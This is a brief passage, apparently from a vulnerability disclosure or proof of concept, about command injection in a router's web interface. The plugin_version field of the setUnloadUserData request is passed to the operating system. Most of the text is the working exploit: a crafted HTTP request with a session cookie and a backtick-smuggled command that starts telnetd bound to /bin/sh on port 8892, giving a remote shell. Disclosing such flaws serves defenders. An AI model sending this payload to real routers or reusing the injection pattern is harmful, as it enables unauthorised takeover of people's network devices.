...
In `setUnloadUserData` function, `plugin_version` is directly passed by the attacker, so we can control the `plugin_version` to attack the OS.
...
We set `plugin_version` as **`telnetd -l /bin/sh -p 8892`** , and the router will excute it,such as:
...
Referer: http://192.168.0.33/left.asp
Cookie: SESSION_ID=2:1777257833:2

{"topicurl":"setting/setUnloadUserData","plugin_version":"`telnetd -l /bin/sh -p 8892`"}
```
